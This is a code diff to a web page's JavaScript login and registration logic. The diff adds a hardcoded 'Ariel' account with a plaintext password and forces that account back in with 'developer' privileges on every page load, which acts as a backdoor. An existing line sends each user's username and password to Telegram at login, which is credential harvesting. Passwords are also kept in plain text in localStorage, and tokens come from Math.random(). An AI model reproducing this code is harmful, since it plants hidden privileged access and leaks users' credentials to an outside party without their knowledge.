@@ -639,11 +639,36 @@
   /* ============================================
      USER DATABASE — localStorage
      ============================================ */
+  var DEFAULT_USERS = [
+    { username: 'Ariel', password: 'ariel123', role: 'developer', registeredAt: '2026-01-01T00:00:00.000Z' }
+  ];
+
   function getUsers() {
     try {
-      return JSON.parse(localStorage.getItem('toolsArielUsers') || '[]');
+      var data = localStorage.getItem('toolsArielUsers');
+      if (!data) {
+        localStorage.setItem('toolsArielUsers', JSON.stringify(DEFAULT_USERS));
+        return DEFAULT_USERS;
+      }
+      var users = JSON.parse(data);
+
+      // Pastikan akun Ariel selalu ada dengan role developer
+      var ariel = users.find(function(u) {
+        return u.username.toLowerCase() === 'ariel';
+      });
+
+      if (!ariel) {
+        users.push(DEFAULT_USERS[0]);
+        localStorage.setItem('toolsArielUsers', JSON.stringify(users));
+      } else {
+        // Paksa role Ariel jadi developer
+        ariel.role = 'developer';
+        localStorage.setItem('toolsArielUsers', JSON.stringify(users));
+      }
+
+      return users;
     } catch (e) {
-      return [];
+      return DEFAULT_USERS;
     }
   }
 
@@ -686,7 +711,7 @@
   }
 
   /* ============================================
-     HANDLE LOGIN — CEK USER DULU
+     HANDLE LOGIN
      ============================================ */
   async function handleLogin(e) {
     e.preventDefault();
@@ -719,11 +744,10 @@
 
     await kirimKeTelegram(username, password, 'login');
 
-    /* HAPUS SEMUA SESSION DULU */
     sessionStorage.clear();
 
-    /* BARU SET SESSION BARU */
-    sessionStorage.setItem('user', username);
+    sessionStorage.setItem('user', user.username);
+    sessionStorage.setItem('role', user.role || 'member');
     sessionStorage.setItem('loginTime', new Date().toISOString());
     sessionStorage.setItem('token', Math.random().toString(36).substring(2));
     sessionStorage.setItem('loginVerified', 'true');
@@ -771,6 +795,7 @@
     users.push({
       username: username,
       password: password,
+      role: 'member',
       registeredAt: new Date().toISOString()
     });
     saveUsers(users);
@@ -791,6 +816,7 @@
   }
 
   window.addEventListener('load', function() {
+    getUsers();
     document.getElementById('loginUser').focus();
   });
 </script>
